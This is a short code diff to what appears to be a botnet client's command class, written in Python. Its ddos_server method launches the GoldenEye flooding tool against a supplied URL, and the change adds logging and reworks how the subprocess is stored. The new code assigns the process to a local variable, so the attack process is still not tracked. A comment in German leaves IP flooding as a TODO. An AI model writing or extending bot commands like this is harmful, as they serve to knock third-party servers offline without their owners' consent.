@@ -24,6 +24,7 @@ class BotCommands(object):
     It is also possible to add new methods during runtime."""
     ddos_process = None
 
+
     def joinParams(self, hallo, hello):
         """Echos its parameters back"""
         return hallo + hello
@@ -34,9 +35,12 @@ class BotCommands(object):
 
     def ddos_server(self, url=None, ip=None, timeout=10):
         if self.ddos_process is None or not self.ddos_process.poll():
+            if self.ddos_process is not None:
+                logging.debug("goldeneye: %s" % self.ddos_process.communicate())
+
             if url:
-                logging.debug("Execute goldeneye")
-                subprocess.Popen(shlex.split("timeout %d goldeneye %s -m random -w 1 -s 2" % (timeout, url)))
+                ddos_process = subprocess.Popen(
+                    shlex.split("timeout %d goldeneye %s -m random -w 1 -s 2" % (timeout, url)))
             elif ip:
                 # TODO: DDOS eine IP
                 pass
